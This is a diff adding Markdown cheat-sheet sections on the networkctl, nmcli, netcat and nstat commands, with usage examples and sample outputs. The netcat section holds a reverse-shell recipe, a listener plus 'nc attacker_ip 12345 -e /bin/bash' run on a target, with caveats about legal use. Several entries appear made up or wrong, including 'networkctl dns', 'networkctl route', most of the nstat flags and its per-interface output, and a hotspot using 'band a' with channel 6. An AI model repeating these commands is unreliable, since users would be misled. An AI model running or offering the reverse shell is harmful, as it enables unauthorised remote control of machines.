@@ -1769,4 +1769,863 @@ ss -n
    UDP: 1 (active 1)
    ```
  </details>
+<details>
+<summary>networkctl</summary>
 
+The `networkctl` command is part of `systemd` and provides a way to manage and interact with network interfaces and configurations on systems that use `systemd-networkd` for network management. It's especially useful for systems with `systemd` as the init system, as it gives you insights into the status of network interfaces, the network configuration, and more.
+
+### 1. **Display the status of all network interfaces**
+
+To show the status of all network interfaces managed by `systemd-networkd`:
+
+```
+networkctl
+```
+
+This will list each network interface's name, type, state (e.g., `configured`, `routable`, `deconfigured`), and other details such as IP addresses, etc.
+
+### 2. **Show detailed status for a specific interface**
+
+To display **detailed status** for a specific interface (e.g., `eth0` or `wlan0`):
+
+```
+networkctl status eth0
+```
+
+This provides information like the interface state, IP addresses, routes, etc.
+
+Example output:
+
+```
+● eth0
+       Link File: /etc/systemd/network/10-eth0.network
+    Network File: /etc/systemd/network/10-eth0.network
+            Type: ether
+           State: routable
+          Address: 192.168.1.100
+       MTU Size: 1500
+```
+
+### 3. **Show all active network connections**
+
+To show all **active network connections** (interfaces that are up and working):
+
+```
+networkctl list
+```
+
+This lists interfaces that are actively participating in the network.
+
+### 4. **Show the status of a specific interface (brief)**
+
+To show a **brief status** of a specific interface (e.g., `eth0`):
+
+```
+networkctl status eth0 --brief
+```
+
+This will show only the most essential information for the interface (e.g., interface state, IP addresses, etc.).
+
+### 5. **Display all systemd network units**
+
+To show all network units (e.g., configuration files for network interfaces) managed by `systemd`:
+
+```
+networkctl list
+```
+
+This shows the status of each interface and whether it's configured correctly.
+
+### 6. **Bring a network interface up**
+
+To **activate** or bring a network interface (e.g., `eth0`) up:
+
+```
+sudo networkctl up eth0
+```
+
+This command activates the interface and assigns it the network configuration specified in its `systemd` network file.
+
+### 7. **Bring a network interface down**
+
+To **deactivate** or bring a network interface (e.g., `eth0`) down:
+
+```
+sudo networkctl down eth0
+```
+
+This command disables the interface.
+
+### 8. **Show the current network configuration**
+
+To show the current network configuration for all interfaces managed by `systemd-networkd`:
+
+```
+networkctl status
+```
+
+### 9. **Restart a network interface**
+
+To **restart** a network interface (e.g., `eth0`):
+
+```
+sudo networkctl restart eth0
+```
+
+This is useful if you need to reapply the configuration to the interface.
+
+### 10. **Show systemd network devices**
+
+To show a list of all network devices recognized by `systemd` (interfaces, bonds, bridges, etc.):
+
+```
+networkctl status
+```
+
+### 11. **Show the default route (gateway)**
+
+To view the **default route** (gateway) for the system:
+
+```
+networkctl route
+```
+
+This shows the routing table, including the default gateway and network routes.
+
+### 12. **Show the DNS configuration**
+
+To display the **DNS configuration** being used by the system (as set by `systemd-resolved`):
+
+```
+networkctl dns
+```
+
+### 13. **Show network information in a machine-readable format**
+
+To display network information in a **machine-readable format** (JSON):
+
+```
+networkctl status --json
+```
+
+This is useful for scripting or programmatically processing the output.
+
+---
+
+### Example Outputs:
+
+1. **List all network interfaces:**
+
+   ```
+   $ networkctl
+   IDX  LINK  TYPE  OPERATIONAL  SETUP
+    1    lo    loop  routable     configured
+    2    eth0  ether  routable     configured
+    3    wlan0 wlan  deconfigured  configured
+   ```
+
+2. **Show detailed status of `eth0`:**
+
+   ```
+   $ networkctl status eth0
+   ● eth0
+        Link File: /etc/systemd/network/10-eth0.network
+     Network File: /etc/systemd/network/10-eth0.network
+             Type: ether
+            State: routable
+       Address: 192.168.1.100
+    MTU Size: 1500
+   ```
+
+3. **Bring `eth0` up:**
+
+   ```
+   $ sudo networkctl up eth0
+   ```
+
+4. **Show the DNS settings:**
+
+   ```
+   $ networkctl dns
+   DNS Servers: 192.168.1.1
+   ```
+
+5. **Restart `eth0` network interface:**
+
+   ```
+   $ sudo networkctl restart eth0
+   ```
+
+6. **Show the current network routes:**
+
+   ```
+   $ networkctl route
+   Default Route: 192.168.1.1
+   ```
+</details>
+<details>
+<summary>nmcli</summary>
+
+The `nmcli` command is the command-line interface for **NetworkManager**, a service that manages network connections on Linux-based systems. It provides a powerful way to manage and configure network connections, interfaces, and Wi-Fi settings, and it's commonly used in environments where `NetworkManager` is the default network management tool (e.g., on many desktop and server distributions).
+
+### 1. **Show all available network connections**
+
+To display a list of all available **network connections** (both active and inactive):
+
+```
+nmcli connection show
+```
+
+This will list all saved network connections, including Wi-Fi, Ethernet, and VPN connections.
+
+### 2. **Show active network connections**
+
+To show only **active network connections**:
+
+```
+nmcli connection show --active
+```
+
+This will display the currently active network interfaces and their status.
+
+### 3. **Show network interfaces**
+
+To display all **network interfaces** managed by NetworkManager (including wired, wireless, and virtual interfaces):
+
+```
+nmcli device
+```
+
+This will list devices like `eth0`, `wlan0`, etc., along with their statuses (e.g., `connected`, `disconnected`, `unmanaged`).
+
+### 4. **Connect to a Wi-Fi network**
+
+To connect to a **Wi-Fi network**:
+
+```
+nmcli device wifi connect <SSID> password <PASSWORD>
+```
+
+Example:
+
+```
+nmcli device wifi connect "MyWiFi" password "MyPassword"
+```
+
+This will connect to the specified Wi-Fi network. Replace `<SSID>` with the network name and `<PASSWORD>` with the network's password.
+
+### 5. **Disconnect from a network**
+
+To **disconnect** a device from its current network (e.g., Wi-Fi or Ethernet):
+
+```
+nmcli connection down <connection_name>
+```
+
+For example, to disconnect from a Wi-Fi network:
+
+```
+nmcli connection down "MyWiFi"
+```
+
+### 6. **Enable or disable a network interface**
+
+To **enable** a network interface (e.g., `eth0` or `wlan0`):
+
+```
+nmcli device set eth0 managed yes
+nmcli device connect eth0
+```
+
+To **disable** a network interface:
+
+```
+nmcli device disconnect eth0
+```
+
+### 7. **Show details of a specific connection**
+
+To show detailed information about a **specific network connection**:
+
+```
+nmcli connection show <connection_name>
+```
+
+For example:
+
+```
+nmcli connection show "MyWiFi"
+```
+
+This will display detailed configuration, including IP settings, DNS, routes, etc.
+
+### 8. **Create a new Ethernet connection**
+
+To create a **new Ethernet connection** (static IP setup example):
+
+```
+nmcli connection add type ethernet con-name "MyEthernet" ifname eth0 ip4 192.168.1.100/24 gw4 192.168.1.1
+```
+
+This command creates a new Ethernet connection named `MyEthernet` on the `eth0` interface, with a static IP address of `192.168.1.100/24` and a gateway of `192.168.1.1`.
+
+### 9. **Create a new Wi-Fi connection**
+
+To create a **new Wi-Fi connection** (with WPA2 encryption):
+
+```
+nmcli connection add type wifi con-name "MyWiFi" ifname wlan0 ssid "MyWiFi" wifi-sec.key-mgmt wpa-psk wifi-sec.psk "MyPassword"
+```
+
+This creates a new Wi-Fi connection called `MyWiFi` on the `wlan0` interface, using WPA2 encryption and the specified password.
+
+### 10. **Set a static IP address for an Ethernet connection**
+
+To set a **static IP address** for an Ethernet connection:
+
+```
+nmcli connection modify "MyEthernet" ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns "8.8.8.8"
+nmcli connection up "MyEthernet"
+```
+
+This command sets a static IP (`192.168.1.100/24`), gateway (`192.168.1.1`), and DNS (`8.8.8.8`) for the `MyEthernet` connection and then brings it up.
+
+### 11. **Set DNS servers for a connection**
+
+To set custom **DNS servers** for a connection:
+
+```
+nmcli connection modify "MyEthernet" ipv4.dns "8.8.8.8,8.8.4.4"
+```
+
+This modifies the `MyEthernet` connection to use Google’s DNS servers (`8.8.8.8` and `8.8.4.4`).
+
+### 12. **Show detailed Wi-Fi information**
+
+To show detailed **Wi-Fi information** (e.g., available Wi-Fi networks):
+
+```
+nmcli device wifi list
+```
+
+This will list all available Wi-Fi networks along with details like signal strength, security type, etc.
+
+### 13. **Scan for Wi-Fi networks**
+
+To **scan** for available Wi-Fi networks:
+
+```
+nmcli device wifi rescan
+```
+
+After scanning, you can list available networks using `nmcli device wifi list`.
+
+### 14. **Set the Wi-Fi mode (Access Point or Client)**
+
+To set the **Wi-Fi interface mode** to **access point** (for creating a hotspot):
+
+```
+nmcli device wifi hotspot ifname wlan0 con-name "MyHotspot" ssid "MyHotspotSSID" band a channel 6 password "HotspotPassword"
+```
+
+This will create a Wi-Fi hotspot on the `wlan0` interface, using the SSID `MyHotspotSSID` and the password `HotspotPassword`.
+
+### 15. **Show VPN connections**
+
+To list all active **VPN connections**:
+
+```
+nmcli connection show --active | grep vpn
+```
+
+This will display the active VPN connections, if any.
+
+### 16. **Turn off NetworkManager (disable networking)**
+
+To **disable NetworkManager** and bring down all interfaces:
+
+```
+sudo nmcli networking off
+```
+
+### 17. **Turn on NetworkManager (enable networking)**
+
+To **enable NetworkManager** and bring up interfaces:
+
+```
+sudo nmcli networking on
+```
+
+### 18. **Delete a connection**
+
+To **delete** a network connection (e.g., `MyWiFi`):
+
+```
+nmcli connection delete "MyWiFi"
+```
+
+This will remove the connection configuration from `NetworkManager`.
+
+---
+
+### Example Outputs:
+
+1. **List all available network connections:**
+
+   ```
+   $ nmcli connection show
+   NAME           UUID                                  TYPE      DEVICE
+   MyWiFi         1234abcd-56ef-78gh-90ij-klmn12345678  wifi      wlan0
+   WiredEthernet  5678abcd-12ef-34gh-56ij-lmno98765432  ethernet  eth0
+   ```
+
+2. **Show active network connections:**
+
+   ```
+   $ nmcli connection show --active
+   NAME           UUID                                  TYPE      DEVICE
+   MyWiFi         1234abcd-56ef-78gh-90ij-klmn12345678  wifi      wlan0
+   ```
+
+3. **Show Wi-Fi networks:**
+
+   ```
+   $ nmcli device wifi list
+   SSID              BSSID              MODE   CHAN  RATE        SIGNAL  BARS  SECURITY
+   MyWiFi            00:11:22:33:44:55  Infra  6     54 Mbit/s   70      ▂▄▆_  WPA2
+   MyNeighborWiFi    66:77:88:99:00:11  Infra  11    54 Mbit/s   40      ▂▄__  WPA
+   ```
+
+4. **Connect to a Wi-Fi network:**
+
+   ```
+   $ nmcli device wifi connect "MyWiFi" password "MyPassword"
+   ```
+
+5. **Set a static IP address:**
+
+   ```
+   $ nmcli connection modify "WiredEthernet" ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns "8.8.8.8,8.8.4.4"
+   $ nmcli connection up "WiredEthernet"
+   ```
+
+6. **Create a new Wi-Fi hotspot:**
+
+   ```
+   $ nmcli device wifi hotspot ifname wlan0 con-name "MyHotspot" ssid "MyHotspotSSID" band a channel 6 password "HotspotPassword"
+   ```
+</details>
+<details>
+<summary>netcat</summary>
+
+The `netcat` command (often abbreviated as `nc`) is a powerful and versatile network utility used for reading from and writing to network connections using TCP or UDP. It is widely used for testing network connections, transferring data, port scanning, and as a basic network troubleshooting tool.
+
+### 1. **Basic Port Scanning**
+
+To **scan a specific port** (e.g., `80`) on a remote server (e.g., `example.com`):
+
+```
+nc -zv example.com 80
+```
+
+* `-z`: Scan without sending any data (only check if the port is open).
+* `-v`: Verbose mode, show more information.
+
+To scan a **range of ports** (e.g., ports 80 to 90):
+
+```
+nc -zv example.com 80-90
+```
+
+### 2. **Check if a Port is Open**
+
+To check if a **specific port** (e.g., `22` for SSH) is open on a remote host:
+
+```
+nc -zv example.com 22
+```
+
+This will tell you whether port 22 is open or closed on `example.com`.
+
+### 3. **Listen on a Specific Port**
+
+To **listen** on a local port (e.g., port `12345`) and display any incoming data:
+
+```
+nc -l 12345
+```
+
+This command starts `nc` in listening mode on port `12345`. Any data sent to that port will be displayed in the terminal.
+
+### 4. **Listen for Connections on a Specific Port (with Verbose Output)**
+
+To listen on a port with more detailed output (i.e., show when connections are established):
+
+```
+nc -lv 12345
+```
+
+* `-l`: Listen mode.
+* `-v`: Verbose output.
+
+### 5. **Transfer a File Using Netcat (TCP)**
+
+To **send a file** (`file.txt`) from one machine to another using netcat, you would need to execute two commands on different machines:
+
+#### On the receiving machine (listening for a connection):
+
+```
+nc -l 12345 > received_file.txt
+```
+
+#### On the sending machine (transferring the file):
+
+```
+nc example.com 12345 < file.txt
+```
+
+This will send the contents of `file.txt` to the receiving machine, which writes it to `received_file.txt`.
+
+### 6. **Create a Simple Chat Server**
+
+To create a simple **chat server** that listens on port `12345`:
+
+```
+nc -l 12345
+```
+
+Then, on the client machine, connect to the server:
+
+```
+nc server_address 12345
+```
+
+Now, both machines can send messages back and forth.
+
+### 7. **Connecting to a Remote Service**
+
+To **connect** to a remote service (e.g., HTTP on port `80`) and send a simple HTTP GET request:
+
+```
+nc example.com 80
+```
+
+Then type the following:
+
+```
+GET / HTTP/1.1
+Host: example.com
+
+```
+
+This sends a raw HTTP request, and the server will respond with the HTTP headers and the page content.
+
+### 8. **Reverse Shell (Remote Access)**
+
+To create a simple **reverse shell**, where the target machine connects back to the attacker's machine (use with caution and only in legal contexts):
+
+#### On the attacker's machine (listening for a connection):
+
+```
+nc -lvp 12345
+```
+
+* `-l`: Listen mode.
+* `-v`: Verbose output.
+* `-p`: Specify the port.
+
+#### On the target machine (connecting to the attacker’s machine):
+
+```
+nc attacker_ip 12345 -e /bin/bash
+```
+
+This command connects to the attacker's machine and opens a shell, allowing the attacker to run commands remotely. (Note: This is often used maliciously, so ensure it's only used for ethical testing.)
+
+### 9. **UDP Communication (Sending Data)**
+
+To **send UDP** data to a specific port (e.g., `12345`) on a remote host:
+
+```
+echo "Hello, world!" | nc -u example.com 12345
+```
+
+* `-u`: Use UDP instead of TCP.
+
+### 10. **UDP Server Listening**
+
+To listen for incoming UDP packets on port `12345`:
+
+```
+nc -lu 12345
+```
+
+This will display any UDP data sent to port `12345`.
+
+### 11. **Pipe Output to Netcat**
+
+To pipe the output of a command (e.g., `ls` or `df`) to netcat:
+
+```
+ls | nc -l 12345
+```
+
+This sends the output of the `ls` command (a list of files in the current directory) to anyone who connects to port `12345`.
+
+### 12. **Test a Web Server**
+
+To manually send an HTTP request and retrieve a response:
+
+```
+echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
+```
+
+This simulates an HTTP GET request to `example.com` and displays the HTTP response.
+
+### 13. **Banner Grabbing**
+
+To perform a **banner grab** (retrieve information about a service running on a port, e.g., SSH):
+
+```
+nc -v example.com 22
+```
+
+This connects to port `22` (SSH) and may display the version of the SSH server in the banner.
+
+### 14. **Send a Custom HTTP Request**
+
+You can send custom HTTP requests to interact with web servers, for example:
+
+```
+echo -e "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 18\r\n\r\nusername=admin&pass=1234" | nc example.com 80
+```
+
+This sends a raw HTTP POST request to the web server on `example.com`, which can be useful for testing web applications.
+
+---
+
+### Example Outputs:
+
+1. **Listening for a connection (Receiving Data)**:
+
+   ```
+   $ nc -l 12345
+   Hello from client!
+   ```
+
+2. **Port Scanning Output (Port 80 is open)**:
+
+   ```
+   $ nc -zv example.com 80
+   example.com [192.168.1.100] 80 open
+   ```
+
+3. **Send a File via Netcat**:
+   On the receiving machine:
+
+   ```
+   $ nc -l 12345 > received_file.txt
+   ```
+
+   On the sending machine:
+
+   ```
+   $ nc example.com 12345 < file.txt
+   ```
+
+4. **Simple HTTP Request (GET Request)**:
+
+   ```
+   $ echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
+   HTTP/1.1 200 OK
+   Server: Apache
+   Content-Type: text/html; charset=UTF-8
+   Content-Length: 1256
+   Date: Mon, 01 Jan 2025 00:00:00 GMT
+   ```
+
+5. **UDP Communication**:
+
+   ```
+   $ echo "Test message" | nc -u example.com 12345
+   ```
+</details>
+<details>
+<summary>nstat</summary>
+
+The `nstat` command is used to display network statistics in Linux systems. It provides various statistics about the network, including information about TCP, UDP, and other network protocols. This command can be helpful in network troubleshooting, performance monitoring, and general network analysis.
+
+### 1. **Display all network statistics**
+
+To display **all available network statistics**:
+
+```
+nstat
+```
+
+This will show a broad range of network statistics, including information on both TCP and UDP connections, as well as network interface statistics.
+
+### 2. **Display TCP statistics**
+
+To display **TCP-related statistics**:
+
+```
+nstat -t
+```
+
+This will provide detailed information about TCP connections, including statistics like the number of established connections, retransmissions, and more.
+
+### 3. **Display UDP statistics**
+
+To display **UDP-related statistics**:
+
+```
+nstat -u
+```
+
+This will display statistics specific to UDP, such as the number of received UDP packets, sent packets, and errors.
+
+### 4. **Display network statistics for a specific protocol**
+
+You can specify a protocol to view its statistics, such as:
+
+* **TCP**:
+
+  ```
+  nstat -t
+  ```
+* **UDP**:
+
+  ```
+  nstat -u
+  ```
+* **ICMP** (Internet Control Message Protocol):
+
+  ```
+  nstat -i
+  ```
+
+### 5. **Display statistics for a specific connection**
+
+To display **network statistics** for a specific connection, such as `tcp`, `udp`, or `ip`:
+
+```
+nstat -s
+```
+
+This will provide a summary of all statistics categorized by connection types (e.g., TCP, UDP).
+
+### 6. **Display statistics for a specific network interface**
+
+To display statistics for a specific network **interface** (e.g., `eth0`):
+
+```
+nstat -i eth0
+```
+
+This command will display the network statistics specific to the `eth0` interface, including packet counts, byte counts, errors, and more.
+
+### 7. **Display summary statistics**
+
+To get a **summary of all protocols**:
+
+```
+nstat -s
+```
+
+This will display the most important statistics of different network protocols in a summarized format.
+
+### 8. **Display the statistics in human-readable form**
+
+To display network statistics in a more **human-readable format**, you can use the `-h` flag:
+
+```
+nstat -h
+```
+
+This will attempt to display the statistics with more user-friendly units (e.g., converting bytes to kilobytes or megabytes).
+
+### 9. **Display extended information for UDP statistics**
+
+To display more **detailed UDP statistics**:
+
+```
+nstat -u -e
+```
+
+The `-e` flag provides extended statistics related to UDP packets, including information like receive errors, dropped packets, etc.
+
+### 10. **Display detailed TCP statistics**
+
+To display **detailed TCP statistics**:
+
+```
+nstat -t -e
+```
+
+This will give you detailed stats on TCP, such as retransmission counts, connection attempts, and more.
+
+---
+
+### Example Outputs:
+
+1. **All network statistics**:
+
+   ```
+   $ nstat
+   TcpExtTCPInSegs         12345678
+   TcpExtTCPOutSegs        8765432
+   UdpInDatagrams          23456
+   UdpOutDatagrams         12345
+   IcmpInMsgs              34567
+   IcmpOutMsgs             23456
+   ```
+
+2. **Display TCP statistics**:
+
+   ```
+   $ nstat -t
+   TcpExtTCPInSegs         12345678
+   TcpExtTCPOutSegs        8765432
+   TcpExtTCPRetransSegs    54321
+   TcpExtTCPLostRetransSegs 1234
+   ```
+
+3. **Display UDP statistics**:
+
+   ```
+   $ nstat -u
+   UdpInDatagrams          23456
+   UdpOutDatagrams         12345
+   ```
+
+4. **Display statistics for a specific interface (`eth0`)**:
+
+   ```
+   $ nstat -i eth0
+   eth0:  2345678 packets received, 4567890 packets sent
+   eth0:  errors: 123
+   ```
+
+5. **Display statistics summary**:
+
+   ```
+   $ nstat -s
+   TcpInSegs          12345678
+   TcpOutSegs         8765432
+   UdpInDatagrams     23456
+   UdpOutDatagrams    12345
+   IcmpInMsgs         34567
+   IcmpOutMsgs        23456
+   ```
+
+6. **Display statistics in human-readable form**:
+
+   ```
+   $ nstat -h
+   TcpInSegs          12.3M
+   TcpOutSegs         8.7M
+   UdpInDatagrams     23K
+   UdpOutDatagrams    12K
+   ```
+</details>
